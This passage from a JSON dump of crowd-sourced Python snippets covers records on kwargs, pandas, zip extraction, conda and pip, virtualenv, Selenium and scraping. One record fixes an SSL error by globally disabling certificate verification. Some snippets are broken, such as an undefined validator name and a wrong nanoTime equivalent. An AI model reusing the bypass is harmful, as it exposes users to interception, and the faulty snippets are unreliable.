    "description": "def add(*args):\t\t# *args takes multiple inputs   return sum(args)   print(add(1,2,3,4,5))    # prints 15 print(add(10, 20, 30))\t # prints 60\ndef calculate(n, **kwargs):   print(n + kwargs['add'])   print(n * kwargs['multiply'])   calculate(3, add=4, multiply=5)\n>>> def argsKwargs(*args, **kwargs): ...     print(args) ...     print(kwargs) ...  >>> argsKwargs('1', 1, 'slgotting.com', upvote='yes', is_true=True, test=1, sufficient_example=True) ('1', 1, 'slgotting.com') {'upvote': 'yes', 'is_true': True, 'test': 1, 'sufficient_example': True}\ndef multiply(*args):     z = 1     for num in args:         z *= num     print(z)  multiply(4, 5) multiply(10, 9) multiply(2, 3, 4) multiply(3, 5, 10, 6)\n",
    "reg_date": "2021-10-12T11:35:29.000Z"
  },
  {
    "id": 4604,
    "keyword": null,
    "link": null,
    "title": " unlimited keyword arguments python",
    "description": "def calculate(n, **kwargs):   print(n + kwargs['add'])   print(n * kwargs['multiply'])   calculate(3, add=4, multiply=5)\n",
    "reg_date": "2021-10-12T11:35:29.000Z"
  },
  {
    "id": 4605,
    "keyword": null,
    "link": null,
    "title": " unnamed 0 pandas",
    "description": "pd.read_csv(file_name, index_col=0)\ndf = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \n# credit to Stack Overflow user in source link  import pandas as pd pd.read_csv(path_to_csv, index_col=0)\n pd.read_csv(file_name, index_col=0)\ndf.to_csv(path, index=False)\n",
    "reg_date": "2021-10-12T11:35:29.000Z"
  },
  {
    "id": 4606,
    "keyword": null,
    "link": null,
    "title": " unzip file python",
    "description": "import zipfile with zipfile.ZipFile(\"file.zip\",\"r\") as zip_ref:     zip_ref.extractall(\"targetdir\")\nimport zipfile with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:     zip_ref.extractall(directory_to_extract_to) \n import zipfile def un_zipFiles(path):     files=os.listdir(path)     for file in files:         if file.endswith('.zip'):             filePath=path+'/'+file             zip_file = zipfile.ZipFile(filePath)             for names in zip_file.namelist():                 zip_file.extract(names,path)             zip_file.close() \nmethod = 'a' from zipfile import ZipFile  with ZipFile(file_directory, 'r') as zip:   zip.printdir()   zip.extractall(save_directory)  method = 'b' unzip -o file.zip\nZipFile.extractall(path=None, members=None, pwd=None) \n",
    "reg_date": "2021-10-12T11:35:29.000Z"
  },
  {
    "id": 4607,
    "keyword": null,
    "link": null,
    "title": " unzip in python",
    "description": "import zipfile with zipfile.ZipFile(\"file.zip\",\"r\") as zip_ref:     zip_ref.extractall(\"targetdir\")\nimport zipfile with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:     zip_ref.extractall(directory_to_extract_to) \n import zipfile def un_zipFiles(path):     files=os.listdir(path)     for file in files:         if file.endswith('.zip'):             filePath=path+'/'+file             zip_file = zipfile.ZipFile(filePath)             for names in zip_file.namelist():                 zip_file.extract(names,path)             zip_file.close() \nmethod = 'a' from zipfile import ZipFile  with ZipFile(file_directory, 'r') as zip:   zip.printdir()   zip.extractall(save_directory)  method = 'b' unzip -o file.zip\nZipFile.extractall(path=None, members=None, pwd=None) \n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4608,
    "keyword": null,
    "link": null,
    "title": " update anaconda",
    "description": "// to update anaconda  conda update conda  // to update all anaconda package conda update --all\nconda update --all \n# If want to update python type conda update python  # To update anaconda type  conda update anaconda  # a) If you want to upgrade between major python version like 3.5 to 3.6, you'll have to do conda install python=$pythonversion$  # b) Method 2 - Create a new environment (Better Method) conda create --name py36 python=3.6  # c) To get the absolute latest python(3.6.5 at time of writing) conda create --name py365 python=3.6.5 --channel conda-forge \nconda update conda\n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4609,
    "keyword": null,
    "link": null,
    "title": " update anaconda from cmd",
    "description": "// to update anaconda  conda update conda  // to update all anaconda package conda update --all\nconda update --all \n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4610,
    "keyword": null,
    "link": null,
    "title": " update jupyter notebook",
    "description": "conda update jupyter \nconda update --all \n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4611,
    "keyword": null,
    "link": null,
    "title": " update link python is python 3",
    "description": "$ python --version Python 2.7.6 $ python3 --version Python 3.4.3 $ alias python=python3 $ python --version Python 3.4.3\n$ \\python --version  Python 2.7.6\n$ command python --version Python 2.7.6\n$ unalias python $ python --version Python 2.7.6\n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4612,
    "keyword": null,
    "link": null,
    "title": " update my anaconda",
    "description": "conda update --all \n",
    "reg_date": "2021-10-12T11:35:30.000Z"
  },
  {
    "id": 4613,
    "keyword": null,
    "link": null,
    "title": " update python in miniconda",
    "description": "conda install python=3.6 \nconda update python \n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4614,
    "keyword": null,
    "link": null,
    "title": " update python ubuntu",
    "description": "sudo apt-get update && sudo apt-get upgrade sudo apt-get install python3.7\n$ sudo apt update -y $ sudo apt install python3.7 \n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4615,
    "keyword": null,
    "link": null,
    "title": " update tensorflow pip",
    "description": "######## for Python 2.7 pip install --upgrade pip pip install --upgrade tensorflow  ######## for Python 3.n pip3 install --upgrade pip pip3 install --upgrade tensorflow\nsudo pip3 install tensorflow\npip install tensorflow==2.0.0\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4616,
    "keyword": null,
    "link": null,
    "title": " update windows wallpaper python",
    "description": "import ctypes ctypes.windll.user32.SystemParametersInfoW(20, 0, \"absolute path\" , 0)\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4617,
    "keyword": null,
    "link": null,
    "title": " upgrade pip",
    "description": "pip3 install --upgrade pip\npython -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\npip install  python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4618,
    "keyword": null,
    "link": null,
    "title": " upgrade python to 3.8",
    "description": "$ sudo apt update -y $ sudo apt install python3.8\n$ sudo apt install python3.9\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4619,
    "keyword": null,
    "link": null,
    "title": " upgrade python to 3.9 i linux",
    "description": "$ sudo apt install python3.9\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4620,
    "keyword": null,
    "link": null,
    "title": " upgrade python version mc",
    "description": "brew install python3 brew update && brew upgrade python alias python=/usr/local/bin/python3\n",
    "reg_date": "2021-10-12T11:35:31.000Z"
  },
  {
    "id": 4621,
    "keyword": null,
    "link": null,
    "title": " upload file in colab",
    "description": "# It will prompt you to select a file. Click on &ldquo;Choose Files&rdquo; then select and upload the file. Wait for the file to be 100% uploaded.  from google.colab import files uploaded = files.upload()  # To store dataset in a Pandas Dataframe import io df2 = pd.read_csv(io.BytesIO(uploaded['Filename.csv']))\nfrom google.colab import files files.upload() \nfrom google.colab import files import io uploaded = files.upload() df2 = pd.read_csv('Filename.csv')# Dataset is now stored in a Pandas Dataframe\nfrom google.colab import files files.upload()\nfrom google.colab import files uploaded = files.upload() \nfrom google.colab import files  uploaded = files.upload()\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4622,
    "keyword": null,
    "link": null,
    "title": " url in form action django",
    "description": "<form action={% url 'url_to:go_to' slug=arg.from_context %}  method=\"POST\">\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4623,
    "keyword": null,
    "link": null,
    "title": " urllib.error.HTTPError: HTTP Error 403: Forbidden",
    "description": "from urllib.request import Request, urlopen  req = Request('http://www.cmegroup.com/trading/products/#sortField=oi&sortAsc=false&venues=3&page=1&cleared=1&group=1', headers={'User-Agent': 'Mozilla/5.0'}) webpage = urlopen(req).read() \nHTTP 403 is a HTTP status code meaning access to the requested resource is forbidden for some reason. \n// Don't be on a forbidden page!!\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4624,
    "keyword": null,
    "link": null,
    "title": " urllib.error.URLError: <urlopen error [SSL: CERTIFICATE VERIFY FAILED] certificate verify failed: unable to get local issuer certificate ( ssl.c:1123)>",
    "description": "import ssl  ssl._create_default_https_context = ssl._create_unverified_context\n1)//import ssl  2)//ssl._create_default_https_context = ssl._create_unverified_context\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4625,
    "keyword": null,
    "link": null,
    "title": " urllib python",
    "description": "#Used to make requests import urllib.request  x = urllib.request.urlopen('https://www.google.com/') print(x.read())\n>>> import urllib3 >>> http = urllib3.PoolManager() >>> r = http.request('GET', 'http://httpbin.org/robots.txt') >>> r.status 200 >>> r.data 'User-agent: *\\nDisallow: /deny\\n' \nimport urllib.request  req = urllib.request.Request('http://www.voidspace.org.uk') with urllib.request.urlopen(req) as response:    the_page = response.read() \n#In Python 3.x, the urlretrieve function is located in the urllib.request module: from urllib.request import urlretrieve\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4626,
    "keyword": null,
    "link": null,
    "title": " urlpatterns = [ path('SignUp/', views.SignupPage, name='user data')\\",
    "description": "from django.urls import include, path  urlpatterns = [     path('index/', views.index, name='main-view'),     path('bio/<username>/', views.bio, name='bio'),     path('articles/<slug:title>/', views.article, name='article-detail'),     path('articles/<slug:title>/<int:section>/', views.section, name='article-section'),     path('weblog/', include('blog.urls')),     ... ] \n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4627,
    "keyword": null,
    "link": null,
    "title": " ursina download python",
    "description": "#In windows command prompt  pip install ursina #In your coding software from ursina import * #If you use pycharm \n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4628,
    "keyword": null,
    "link": null,
    "title": " ursina reparenting",
    "description": "<ursina.Entity>.reparent_to(entity)\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4629,
    "keyword": null,
    "link": null,
    "title": " use beautifulsoup",
    "description": "#start   from bs4 import BeautifulSoup import requests  req = requests.get('https://www.slickcharts.com/sp500') soup = BeautifulSoup(req.text, 'html.parser')\n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4630,
    "keyword": null,
    "link": null,
    "title": " use nltk to remove stop words",
    "description": "from nltk.corpus import stopwords nltk.download(\"stopwords\") stop = set(stopwords.words(\"english\")) filtered_words = [word.lower() for word in text.split() if word.lower() not in stop] \n",
    "reg_date": "2021-10-12T11:35:32.000Z"
  },
  {
    "id": 4631,
    "keyword": null,
    "link": null,
    "title": " use of the word bruh over time",
    "description": "# @Grieving Grouse, we do use grepper for programming and we love it\n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4632,
    "keyword": null,
    "link": null,
    "title": " use python3 as default mac",
    "description": "ln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \n# it is said not to do but I used it anyway, because of the conveniency $ echo \"alias python=/usr/local/bin/python3.7\" >> ~/.zshrc \n$ brew install pyenv \n[ -e ~/.profile ] && . ~/.profile \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4633,
    "keyword": null,
    "link": null,
    "title": " use selenium without opening browser",
    "description": "option = webdriver.ChromeOptions() option.add_argument('headless') driver = webdriver.Chrome('path/to/chromedriver',options=option) \nfrom selenium import webdriver   # for webdriver from selenium.webdriver.support.ui import WebDriverWait  # for implicit and explict waits from selenium.webdriver.chrome.options import Options  # for suppressing the browser \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4634,
    "keyword": null,
    "link": null,
    "title": " use sqlalchemy to create sqlite3 database",
    "description": "from sqlalchemy import create_engine import pandas as pd # creates an engine for a database in current directory  engine = create_engine('sqlite:///yourDatabaseName.sqlite3')  # creates a dataframe in memory df = pd.DataFrame({'tablename' : ['Data 1', 'Data 2', 'Data 3']}) # stores the dataframe as a table in the database df.to_sql('tablename', con=engine) # queries the table and stores the results in another dataframe dfOne = pd.read_sql_table('tablename', engine) # or you can create a custom sql query and store the results in a dataframe dfTwo = pd.DataFrame(engine.execute(\"SELECT * FROM tablename\").fetchall()) \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4635,
    "keyword": null,
    "link": null,
    "title": " useful python snippets",
    "description": "1)https://betterprogramming.pub/20-python-snippets-you-should-learn-today-8328e26ff124 2) https://python.plainenglish.io/26-python-code-and-snippets-that-will-make-laziness-shine-21ab969c8a35 3) https://www.kdnuggets.com/2021/06/10-python-code-snippets.html\n# install Kite automatically on all your IDEs ''' https://www.kite.com/ '''\n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4636,
    "keyword": null,
    "link": null,
    "title": " user agent for python",
    "description": "headers = {\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\"}  #Lets test what headers are sent by sending a request to HTTPBin r = requests.get('http://httpbin.org/headers',headers=headers) pprint(r.json()) \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4637,
    "keyword": null,
    "link": null,
    "title": " uses of python",
    "description": "Uses of python include: Web Development Game Development Machine Learning and Artificial Intelligence Data Science and Data Visualization Desktop GUI (Graphic User Interface) Web Scraping Applications Business Applications Audio and Video Applications CAD Applications Embedded Applications\n#Hello world in Java: public class Main {     public static void main(String[] args) {         System.out.println(\"hello world\");     } }  #Hello world in Python: print('hello world')  #See?\nUSES Relation is known as Association (Relationship between two seperate class with the help of their object)\n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4638,
    "keyword": null,
    "link": null,
    "title": " using-len-for-text-but-discarding-spaces-in-the-count",
    "description": ">>> full_name = \"John DOE\" >>> len(full_name) - full_name.count(' ') 7 \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4639,
    "keyword": null,
    "link": null,
    "title": " using bs4 to obtain html element by id",
    "description": ">>> import BeautifulSoup >>> soup = BeautifulSoup.BeautifulSoup('<html><body><div id=\"articlebody\"> ... </div></body></html') >>> soup.find(\"div\", {\"id\": \"articlebody\"}) <div id=\"articlebody\"> ... </div> \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4640,
    "keyword": null,
    "link": null,
    "title": " using regex validators in django models",
    "description": "from django.core.validators import RegexValidator from django.db import models PHONE_NUMBER_REGEX = RegexValidator(r'^[+]*[(]{0,1}[0-9]{1,4}[)]{0,1}[-\\s\\./0-9]*$', 'only valid email is required') class SomeClass(models.Model):   phone =  models.CharField(max_length=14, validators=[PHONE_REGEX])   \n",
    "reg_date": "2021-10-12T11:35:33.000Z"
  },
  {
    "id": 4641,
    "keyword": null,
    "link": null,
    "title": " usong brave browser pyhton",
    "description": "from selenium import webdriver  driver_path = \"C:/Users/username/PycharmProjects/chromedriver.exe\" brave_path = \"C:/Program Files (x86)/BraveSoftware/Brave-Browser/Application/brave.exe\"  option = webdriver.ChromeOptions() option.binary_location = brave_path # option.add_argument(\"--incognito\") OPTIONAL # option.add_argument(\"--headless\") OPTIONAL  # Create new Instance of Chrome browser = webdriver.Chrome(executable_path=driver_path, chrome_options=option)  browser.get(\"https://www.google.es\")\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4642,
    "keyword": null,
    "link": null,
    "title": " utf8 python encodage line",
    "description": "# -*- coding: utf-8 -*-\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4643,
    "keyword": null,
    "link": null,
    "title": " uuid regex",
    "description": "/[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}/\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4644,
    "keyword": null,
    "link": null,
    "title": " value counts() in pandas",
    "description": "df = df.value_counts().rename_axis('unique_values').reset_index(name='counts') print (df)    unique_values  counts 0              2       3 1              1       2 \n>>> index = pd.Index([3, 1, 2, 3, 4, np.nan]) >>> index.value_counts() 3.0    2 4.0    1 2.0    1 1.0    1 dtype: int64 \ndf.nunique()\n  df.letters.value_counts().sort_values().plot(kind = 'barh') \nfrom collections import Counter values=np.ones(10) Counter(values)\nuse of value_counts()\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4645,
    "keyword": null,
    "link": null,
    "title": " value counts pandas",
    "description": "df = df.value_counts().rename_axis('unique_values').reset_index(name='counts') print (df)    unique_values  counts 0              2       3 1              1       2 \n>>> index = pd.Index([3, 1, 2, 3, 4, np.nan]) >>> index.value_counts() 3.0    2 4.0    1 2.0    1 1.0    1 dtype: int64 \ndf.stack().value_counts()\n  df.letters.value_counts().sort_values().plot(kind = 'barh') \ncol-name.value_count()\ndf.value_counts(normalize=True) \n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4646,
    "keyword": null,
    "link": null,
    "title": " valueerror need more than 2 values to unpack findcontours",
    "description": "if cv2.getVersionMajor() in [2, 4]:     # OpenCV 2, OpenCV 4 case     contour, hier = cv2.findContours(                     thresh.copy(), cv2.RETR_CCOMP, cv2.CHAIN_APPROX_NONE) else:     # OpenCV 3 case     image, contour, hier = cv2.findContours(                     thresh.copy(), cv2.RETR_CCOMP, cv2.CHAIN_APPROX_NONE)\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4647,
    "keyword": null,
    "link": null,
    "title": " values outside range pandas",
    "description": "# Get rid of values inside a range for a defined column df = df[~df['column_name'].between(lower_boundary,upper_boundary)]\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4648,
    "keyword": null,
    "link": null,
    "title": " variable inside class not detecting global variable in python",
    "description": "some_global_variable  class TestClass():     def run(self):         #we can access it by defining the variable as global inside the function         global some_global_variable          for i in range(10):             some_global_variable = 1             print(some_global_variable)\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4649,
    "keyword": null,
    "link": null,
    "title": " variables and datatypes in python",
    "description": "# you can use the function type() which will returns the type of the variable A = \"Hello world !\" # here are some uses of it >>> type(A) <class 'str'> >>> type(A) is int False >>> type(A) is str True\n# Pyhton data types  # Integer age = 18  # Float (AKA Floating point number) current_balance = 51.28  # Boolean is_tall = False # can be set to either True or False  # String message = \"Have a nice day\"  # List my_list = [\"apples\", 5, 7.3]  # Dictionary my_dictionary = {'amount': 75}  # Tuple coordinates = (40, 74) # can NOT be changed later  # Set my_set = {5, 6, 3}\n# Float average_tutorial_rating = 4.01 # Integer age = 20 # Boolean tutorials_are_good = True # True or False # arrays/lists numbers = [1, 2, 3]\nText Type:\tstr Numeric Types:\tint, float, complex Sequence Types:\tlist, tuple, range Mapping Type:\tdict Set Types:\tset, frozenset Boolean Type:\tbool Binary Types:\tbytes, bytearray, memoryview \n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4650,
    "keyword": null,
    "link": null,
    "title": " venv upgrade python",
    "description": "python3 -m venv --upgrade ENV_DIR\nactivate venv\n",
    "reg_date": "2021-10-12T11:35:34.000Z"
  },
  {
    "id": 4651,
    "keyword": null,
    "link": null,
    "title": " verificar se arquivo existe python",
    "description": "# Voc&ecirc; pode usar exists:  import os.path os.path.exists('nome.ext')  # Mas que tamb&eacute;m vai retornar True para diret&oacute;rios, se voc&ecirc; quer ter certeza de que &eacute; um arquivo realmente use isfile:  import os.path os.path.isfile('nome.ext')\n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4652,
    "keyword": null,
    "link": null,
    "title": " version of scikit learn",
    "description": "In [3]: import sklearn  In [4]: sklearn.__version__ Out[4]: '0.19.0'\n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4653,
    "keyword": null,
    "link": null,
    "title": " vertical line in matplotlib",
    "description": "xposition = [0.3, 0.4, 0.45] for xc in xposition:     plt.axvline(x=xc, color='k', linestyle='--')\n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4654,
    "keyword": null,
    "link": null,
    "title": " virtual env create python",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npip install virtualenv cd projectfolder #go to project folder virtualenv projectname #create the folder projectname  source projectname/bin/activate\npip install virtualenv # install first cd projectfolder # go to project folder python -m venv ./venv # Create a virtual environment named venv Activate.ps1 # (powershell) start the file  to start the environment activate.bat # (cmd) start the file  to start the environment # if it worked you'll see a (venv) in front of your cursor path\n# First install virtualenv !pip3 install virtualenv  # Go to the desired directory which you wish you run your virtual environment. cd project_directory  # create a virtual environment called my_virtualenv virtualenv my_virtualenv  ### to run the virtual environemt run \"activate\" as in the following command .\\my_virtualenv\\Scripts\\activate\nvirtualenv -p python3 envname\nsource env/bin/activate \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4655,
    "keyword": null,
    "link": null,
    "title": " virtual env in python",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \n# for windows 10  py -m venv myvirtualenv myvirtualenv\\Scripts\\activate #!!!! use \"\\\" not \"/\" !!!!!\npip install --user virtualenv py -m venv env .\\env\\Scripts\\activate\nsudo apt install python3-venv  python3 -m venv my-project-env  source my-project-env/bin/activate \npython3 -m venv tutorial-env \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4656,
    "keyword": null,
    "link": null,
    "title": " virtual environment mac",
    "description": "1. \t# Creates the virtual enviroment. \tvirtualenv venv    2.  # Activates virtual enviroment. \tsource venv/bin/activate\nsource venv/bin/activate\npython3 -m pip install --user virtualenv \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4657,
    "keyword": null,
    "link": null,
    "title": " virtualenv -p python3",
    "description": "virtualenv -p python3.6 venv  For simple python3  virtualenv -p python3 venv \nvirtualenv --python=/usr/bin/python2.6 <path/to/new/virtualenv/> \npy -m venv env \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4658,
    "keyword": null,
    "link": null,
    "title": " visualize correlation matrix python",
    "description": "import seaborn as sns df = sns.load_dataset('iris') corr_matrix = df.corr() corr_matrix.style.background_gradient(cmap='coolwarm') # 'RdBu_r', 'BrBG_r', & PuOr_r are other good diverging colormaps \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4659,
    "keyword": null,
    "link": null,
    "title": " vowel and consonant list python",
    "description": "vowel = [\"a\", \"e\", \"i\", \"o\", \"u\"] consonant = [\"b\", \"c\", \"d\", \"f\", \"g\", \"h\", \"j\", \"k\", \"l\", \"m\", \"n\", \"p\", \"q\", \"r\", \"s\", \"t\", \"v\", \"w\", \"x\", \"y\", \"z\"]\n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4660,
    "keyword": null,
    "link": null,
    "title": " vscode jupyter notebook python not started",
    "description": "How I solved it: 1) Press Command+Shift+P to open a new command pallete 2) Type >Python: Select Intepreter to start jupyter notebook server 3) Open the notebook again  And it worked fine. Hope it works for you. \n",
    "reg_date": "2021-10-12T11:35:35.000Z"
  },
  {
    "id": 4661,
    "keyword": null,
    "link": null,
    "title": " wait function python",
    "description": "import time   # Wait for 5 seconds time.sleep(5)   # Wait for 300 milliseconds # .3 can also be used time.sleep(.300) \nimport time #Waits 1 second time.sleep(1)\n# You need to import time first import time #now you have time you can make time wait/sleep time.sleep(10) #time will wait/sleep for 10 seconds\nfrom time import sleep  >>> sleep(4)\n#Wait in python #Module required - time import time #Wait in for the time you put time.sleep(0.5) print('Wait in python')\n# Example code  import time  time.sleep(3) print(\"Three seconds is over!\")    # Tutorial  import time  # This is mandatory to make this work.  time.sleep(x)  # x being the time you want the system to wait, in seconds. # Code you want to execute goes here.\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4662,
    "keyword": null,
    "link": null,
    "title": " warning ignore python",
    "description": "import warnings warnings.filterwarnings(\"ignore\")\nimport warnings warnings.filterwarnings(\"ignore\") \nimport warnings  def fxn():     warnings.warn(\"deprecated\", DeprecationWarning)  with warnings.catch_warnings():     warnings.simplefilter(\"ignore\")     fxn()\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4663,
    "keyword": null,
    "link": null,
    "title": " weather reporter with python",
    "description": "import time import requests from pprint import pprint  try:          Api_key = \"Your api key\"     city_or_country = str(input('Write a \"city\" or \"Country\" name for which you want the weather:- '))     print(\"Fetching Data of\",city_or_country)     time.sleep(4)     URL = \"https://api.openweathermap.org./data/2.5/weather?appid=\" + Api_key + \"&q=\"+ city_or_country     weather_data = requests.get(URL).json()     pprint(weather_data) except ValueError:     print(\"incorrect input or API KEY\")\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4664,
    "keyword": null,
    "link": null,
    "title": " webbrowser python could not locate runnable browser",
    "description": "import webbrowser     urL='https://www.google.com' chrome_path=\"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\" webbrowser.register('chrome', None,webbrowser.BackgroundBrowser(chrome_path)) webbrowser.get('chrome').open_new_tab(urL)\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4665,
    "keyword": null,
    "link": null,
    "title": " webbscraping website with beautifulsoup",
    "description": "import requests from bs4 import BeautifulSoup  URL = 'https://www.monster.com/jobs/search/?q=Software-Developer&where=Australia' page = requests.get(URL)  soup = BeautifulSoup(page.content, 'html.parser') \nimport scrapy from ..items import SampletestItem #items class  class QuoteTestSpider(scrapy.Spider):     name = 'quote_test'     start_urls = ['https://quotes.toscrape.com/']      def parse(self, response):         items = SampletestItem() #items class         quotes = response.css(\"div.quote\")         for quote in quotes:             items['title'] = quote.css(\"span.text::text\").get()             items['author'] = quote.css(\".author::text\").get()             items['tags'] = quote.css(\".tags .tag::text\").getall()                          yield items             next_page = response.css(\".next a::attr(href)\").get()             if next_page is not None:                 next_url = response.urljoin(next_page)                 yield scrapy.Request(next_url, callback=self.parse)\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4666,
    "keyword": null,
    "link": null,
    "title": " webcam cv2",
    "description": "import cv2  cap = cv2.VideoCapture(0)  # Check if the webcam is opened correctly if not cap.isOpened():     raise IOError(\"Cannot open webcam\")  while True:     ret, frame = cap.read()     frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)     cv2.imshow('Input', frame)      c = cv2.waitKey(1)     if c == 27:         break  cap.release() cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4667,
    "keyword": null,
    "link": null,
    "title": " webdriver.ChromeOptions()",
    "description": "from selenium import webdriver  opt = webdriver.ChromeOptions() opt.add_argument(\"--disable-infobars\") opt.add_argument(\"start-maximized\") opt.add_argument(\"--disable-extensions\") opt.add_argument(\"--start-maximized\") opt.add_argument(\"no-sandbox\") opt.add_argument(\"--disable-gpu\") opt.add_argument(\"--disable-dev-shm-usage\") opt.add_argument(\"--incognito\") opt.add_argument(\"--headless\") opt.add_argument(\"--disable-xss-auditor\") opt.add_argument(\"--disable-web-security\") opt.add_argument(\"--allow-running-insecure-content\") opt.add_argument(\"--disable-setuid-sandbox\") opt.add_argument(\"--disable-webgl\") opt.add_argument(\"--disable-popup-blocking\") # Pass the argument 1 to allow and 2 to block opt.add_experimental_option(\"prefs\", {     \"profile.default_content_setting_values.media_stream_mic\": 2,     \"profile.default_content_setting_values.media_stream_camera\": 2,     \"profile.default_content_setting_values.geolocation\": 2,     \"profile.default_content_setting_values.notifications\": 2 }) driver = webdriver.Chrome(chromepath, chrome_options=opt) driver.get(url)  # https://selenium-python.readthedocs.io/api.html\nopt.add_argument(\"--disable-infobars\")\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4668,
    "keyword": null,
    "link": null,
    "title": " werkzeug.datastructures.filestorage to numpy",
    "description": "#read image file string data filestr = request.files['file'].read() #convert string data to numpy array npimg = numpy.fromstring(filestr, numpy.uint8) # convert numpy array to image img = cv2.imdecode(npimg, cv2.CV_LOAD_IMAGE_UNCHANGED)\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4669,
    "keyword": null,
    "link": null,
    "title": " what's the equivalent to System.nanotime in python",
    "description": "import time  # equivalent to java's System.nanoTime(): time.time() * 1000000000\n",
    "reg_date": "2021-10-12T11:35:36.000Z"
  },
  {
    "id": 4670,
    "keyword": null,
    "link": null,
    "title": " what day i s it",
